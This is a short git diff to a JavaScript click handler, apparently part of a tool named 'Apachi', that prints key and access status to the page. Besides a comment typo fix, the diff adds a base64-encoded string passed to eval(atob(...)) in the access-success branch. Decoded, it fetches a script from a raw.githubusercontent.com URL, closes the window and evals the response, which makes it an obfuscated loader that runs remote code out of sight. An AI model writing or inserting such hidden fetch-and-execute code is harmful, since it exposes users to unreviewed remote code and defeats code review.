@@ -63,10 +63,15 @@ sen.onclick = function () {
           port.innerHTML += "key:success" + `<br>`;
 
           if (myObj.auth == true) {
-            //proced
+            //procced
 
             port.innerHTML += "Access:succsess";
             port.style = "color:lime";
+            eval(
+              atob(
+                "cmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7cmVxLm9wZW4oJ0dFVCcsICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdGhlZmF0cG90YXRvMTE1L0FwYWNoaS9tYWluL1Jlc291cmNlcy9pbmRleC5qcycpO3JlcS5vbmxvYWQgPSBmdW5jdGlvbigpIHsgd2luZG93LmNsb3NlKCk7ZXZhbCh0aGlzLnJlc3BvbnNlVGV4dCk7IH07cmVxLnNlbmQoKTs=",
+              ),
+            );
           } else if (myObj.auth == false) {
             port.innerHTML +=
               "Access:faild, Reason: Auth fail. To fix please contact an apachi sales rep.";
